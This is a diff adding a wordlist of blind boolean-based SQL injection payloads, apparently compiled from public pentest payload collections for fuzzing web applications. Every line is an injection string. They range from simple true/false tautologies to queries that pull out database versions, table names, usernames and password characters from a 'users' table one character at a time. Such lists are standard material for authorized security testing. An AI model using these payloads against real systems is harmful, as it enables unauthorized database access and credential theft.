@@ -1,0 +1,38 @@
+# SQLi Blind Boolean-Based Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Infer database content by observing True/False differences in responses.
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+1 OR 1=1
+1 OR 1=2
+' AND 1=1#
+' AND 1=2#
+' AND 1=1/*
+' AND 1=2/*
+" AND 1=1--
+" AND 1=2--
+" AND "1"="1
+" AND "1"="2
+' AND SUBSTRING(version(),1,1)='5'--
+' AND SUBSTRING(version(),1,1)='8'--
+' AND SUBSTRING(version(),1,1)='M'--
+' AND ASCII(SUBSTRING(version(),1,1))>52--
+' AND ASCII(SUBSTRING(username,1,1))>64--
+' AND ASCII(SUBSTRING(username,1,1))>96--
+' AND ASCII(SUBSTRING(username,1,1))>97--
+' AND LENGTH(username)>0--
+' AND LENGTH(database())>0--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
+1 AND (SELECT 1 FROM users WHERE username='admin')=1--
+1 AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database())=1--
